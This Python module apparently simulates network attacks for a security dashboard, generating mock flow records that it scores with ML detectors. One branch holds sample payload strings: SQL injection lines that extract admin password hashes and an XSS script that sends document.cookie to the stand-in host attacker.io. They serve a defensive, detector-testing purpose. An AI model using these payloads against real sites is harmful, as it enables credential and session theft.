"""
Synthetic Traffic & Live Attack Simulator Engine.
Generates safe, sandboxed, mock event streams, packet bursts, and attack vectors.
"""
from typing import Dict, List, Any, Optional
import time
import random
from ml.tabular_dnn import get_tabular_dnn
from ml.graph_sage import get_graph_sage
from app.services.risk_engine import get_risk_engine

ATTACK_TYPES = {
    "DDOS_SYN_FLOOD": {
        "name": "Volumetric DDoS / SYN Flood Simulation",
        "severity": "CRITICAL",
        "description": "High-velocity TCP SYN burst exhausting connection state tables.",
        "source": "EXTERNAL_BOTNET_SWARM",
        "target": "node-soc-master",
        "ports": [80, 443, 8443],
        "attack_vector_ray": {"source": "node-gw-alpha", "target": "node-soc-master"}
    },
    "STEALTH_RECON": {
        "name": "Stealth Lateral Reconnaissance Sweep",
        "severity": "WARN",
        "description": "Slow horizontal TCP SYN/FIN port sweep scanning internal endpoints.",
        "source": "node-gw-alpha",
        "target": "node-db-cluster",
        "ports": [22, 80, 443, 5432, 6379, 8080],
        "attack_vector_ray": {"source": "node-gw-alpha", "target": "node-db-cluster"}
    },
    "APPLAYER_EXPLOIT": {
        "name": "Application-Layer Exploit Payload (SQLi / XSS Mock)",
        "severity": "CRITICAL",
        "description": "Obfuscated SQL injection and remote code execution payload in HTTP POST stream.",
        "source": "node-app-srv2",
        "target": "node-db-cluster",
        "ports": [5432, 8000],
        "attack_vector_ray": {"source": "node-app-srv2", "target": "node-db-cluster"}
    },
    "ROGUE_NODE_JOIN": {
        "name": "Rogue Unauthenticated Node Join",
        "severity": "CRITICAL",
        "description": "Shadow endpoint MAC spoofing and ARP poisoning on Subnet Beta.",
        "source": "node-rogue-x99",
        "target": "node-gw-beta",
        "ports": [4444, 1337],
        "attack_vector_ray": {"source": "node-rogue-x99", "target": "node-gw-beta"}
    }
}

class AttackSimulator:
    def __init__(self):
        self.active_attack: Optional[str] = None
        self.attack_start_time: float = 0.0
        self.event_counter: int = 1000
        self.tabular_dnn = get_tabular_dnn()
        self.graph_sage = get_graph_sage()
        self.risk_engine = get_risk_engine()

    def set_attack_state(self, attack_type: Optional[str]) -> Dict[str, Any]:
        if attack_type is not None and attack_type not in ATTACK_TYPES:
            return {"success": False, "error": f"Unknown attack type {attack_type}"}

        self.active_attack = attack_type
        if attack_type:
            self.attack_start_time = time.time()
            if attack_type == "ROGUE_NODE_JOIN":
                self.risk_engine.register_rogue_node()
        else:
            self.risk_engine.reset_rogue_node()

        return {
            "success": True,
            "active_attack": self.active_attack,
            "metadata": ATTACK_TYPES.get(attack_type) if attack_type else None,
            "timestamp": time.time()
        }

    def generate_flow_packet(self) -> Dict[str, Any]:
        self.event_counter += 1
        attack = self.active_attack

        if attack == "DDOS_SYN_FLOOD":
            flow = {
                "flow_duration_ms": random.uniform(5.0, 30.0),
                "total_fwd_packets": random.randint(250, 800),
                "total_bwd_packets": random.randint(0, 3),
                "flow_bytes_per_sec": random.uniform(1800000.0, 6500000.0),
                "flow_packets_per_sec": random.uniform(8500.0, 24000.0),
                "syn_flag_count": random.randint(240, 780),
                "ack_flag_count": random.randint(0, 4),
                "rst_flag_count": random.randint(10, 40),
                "avg_packet_size": random.uniform(64.0, 128.0),
                "header_entropy": random.uniform(2.1, 3.8),
                "protocol": "TCP/SYN",
                "source_ip": f"198.51.100.{random.randint(2, 250)}",
                "dest_ip": "10.0.0.1",
                "dest_port": 443,
                "payload_sample": "0x00020405b40103030801010402"
            }
        elif attack == "STEALTH_RECON":
            flow = {
                "flow_duration_ms": random.uniform(10.0, 45.0),
                "total_fwd_packets": random.randint(25, 40),
                "total_bwd_packets": random.randint(1, 5),
                "flow_bytes_per_sec": random.uniform(250.0, 950.0),
                "flow_packets_per_sec": random.uniform(15.0, 50.0),
                "syn_flag_count": random.randint(25, 38),
                "ack_flag_count": random.randint(1, 3),
                "rst_flag_count": random.randint(15, 30),
                "avg_packet_size": random.uniform(40.0, 60.0),
                "header_entropy": random.uniform(4.5, 6.2),
                "protocol": "TCP/SCAN",
                "source_ip": "10.0.1.1",
                "dest_ip": "10.0.1.50",
                "dest_port": random.choice([22, 80, 443, 5432, 6379, 8080]),
                "payload_sample": "TCP FIN/PSH probe sweep"
            }
        elif attack == "APPLAYER_EXPLOIT":
            sql_payloads = [
                "UNION SELECT username, password_hash FROM admin_users--",
                "1' OR '1'='1' UNION ALL SELECT NULL, version()--",
                "<script>fetch('http://attacker.io/leak?k='+document.cookie)</script>"
            ]
            flow = {
                "flow_duration_ms": random.uniform(80.0, 320.0),
                "total_fwd_packets": random.randint(12, 35),
                "total_bwd_packets": random.randint(10, 30),
                "flow_bytes_per_sec": random.uniform(45000.0, 180000.0),
                "flow_packets_per_sec": random.uniform(120.0, 350.0),
                "syn_flag_count": random.randint(1, 3),
                "ack_flag_count": random.randint(10, 30),
                "rst_flag_count": 0,
                "avg_packet_size": random.uniform(850.0, 1420.0),
                "header_entropy": random.uniform(7.4, 8.9),
                "protocol": "HTTP/POST",
                "source_ip": "10.0.2.11",
                "dest_ip": "10.0.1.50",
                "dest_port": 5432,
                "payload_sample": random.choice(sql_payloads)
            }
        elif attack == "ROGUE_NODE_JOIN":
            flow = {
                "flow_duration_ms": random.uniform(40.0, 150.0),
                "total_fwd_packets": random.randint(40, 110),
                "total_bwd_packets": random.randint(20, 60),
                "flow_bytes_per_sec": random.uniform(220000.0, 850000.0),
                "flow_packets_per_sec": random.uniform(300.0, 900.0),
                "syn_flag_count": random.randint(10, 25),
                "ack_flag_count": random.randint(15, 30),
                "rst_flag_count": 2,
                "avg_packet_size": random.uniform(512.0, 1024.0),
                "header_entropy": random.uniform(6.8, 7.9),
                "protocol": "RAW_ETHER/ARP",
                "source_ip": "10.0.2.199",
                "dest_ip": "10.0.2.1",
                "dest_port": 4444,
                "is_unregistered_mac": 1,
                "payload_sample": "ARP Gratuitous reply [DE:AD:BE:EF:00:99 -> 10.0.2.1]"
            }
        else:
            # Benign baseline flow
            flow = {
                "flow_duration_ms": random.uniform(15.0, 250.0),
                "total_fwd_packets": random.randint(5, 30),
                "total_bwd_packets": random.randint(5, 35),
                "flow_bytes_per_sec": random.uniform(4000.0, 35000.0),
                "flow_packets_per_sec": random.uniform(40.0, 180.0),
                "syn_flag_count": random.randint(1, 2),
                "ack_flag_count": random.randint(5, 30),
                "rst_flag_count": 0,
                "avg_packet_size": random.uniform(256.0, 800.0),
                "header_entropy": random.uniform(3.5, 4.8),
                "protocol": random.choice(["TLS_1.3", "HTTPS", "DNS/UDP", "gRPC"]),
                "source_ip": random.choice(["10.0.2.10", "10.0.2.11", "10.0.1.50"]),
                "dest_ip": random.choice(["10.0.0.1", "10.0.1.1", "10.0.2.1"]),
                "dest_port": random.choice([443, 8000, 5432, 53]),
                "payload_sample": "ENCRYPTED_APPLICATION_DATA"
            }

        # Run Tabular DNN inference
        dnn_result = self.tabular_dnn.predict(flow)

        return {
            "event_id": f"EVT-{self.event_counter}",
            "timestamp": time.time(),
            "flow_metrics": flow,
            "inference": dnn_result
        }

    def generate_telemetry_burst(self) -> Dict[str, Any]:
        """
        Creates an aggregated telemetry snapshot for streaming via WebSocket or SSE.
        Includes graph topology state, live packet flow, GNN graph inference, and terminal logs.
        """
        flow_evt = self.generate_flow_packet()
        topology = self.risk_engine.get_topology()
        gnn_result = self.graph_sage.infer(
            nodes=topology["nodes"],
            edges=topology["edges"],
            active_attack=self.active_attack
        )

        # Dynamic SOC telemetry metrics
        base_throughput = 850 if not self.active_attack else (
            14500 if self.active_attack == "DDOS_SYN_FLOOD" else 3200
        )
        packet_throughput = round(base_throughput + random.uniform(-60, 60), 1)
        fpr = 0.008 if not self.active_attack else 0.002

        terminal_log = {
            "id": f"log-{self.event_counter}",
            "timestamp": time.strftime("%H:%M:%S", time.localtime()),
            "severity": flow_evt["inference"]["severity"],
            "source": flow_evt["flow_metrics"]["source_ip"],
            "destination": f"{flow_evt['flow_metrics']['dest_ip']}:{flow_evt['flow_metrics']['dest_port']}",
            "protocol": flow_evt["flow_metrics"]["protocol"],
            "detection": flow_evt["inference"]["prediction"],
            "confidence": flow_evt["inference"]["confidence"],
            "message": f"[{flow_evt['inference']['prediction']}] p={flow_evt['inference']['confidence']:.2f} | Latency: {flow_evt['inference']['inference_latency_ms']}ms | {flow_evt['flow_metrics']['payload_sample'][:36]}"
        }

        attack_ray = None
        if self.active_attack and self.active_attack in ATTACK_TYPES:
            attack_ray = ATTACK_TYPES[self.active_attack]["attack_vector_ray"]

        return {
            "type": "TELEMETRY_BURST",
            "active_attack": self.active_attack,
            "attack_metadata": ATTACK_TYPES.get(self.active_attack) if self.active_attack else None,
            "attack_vector_ray": attack_ray,
            "metrics": {
                "packet_throughput_mbs": packet_throughput,
                "gnn_latency_ms": gnn_result["inference_latency_ms"],
                "dnn_latency_ms": flow_evt["inference"]["inference_latency_ms"],
                "false_positive_rate": fpr,
                "active_connections": len(topology["edges"]),
                "graph_entropy": gnn_result["global_graph_entropy"],
                "blast_radius_factor": gnn_result["blast_radius_factor"]
            },
            "latest_flow": flow_evt,
            "gnn_topology_inference": gnn_result,
            "log": terminal_log,
            "topology": topology
        }

_simulator = None

def get_simulator() -> AttackSimulator:
    global _simulator
    if _simulator is None:
        _simulator = AttackSimulator()
    return _simulator
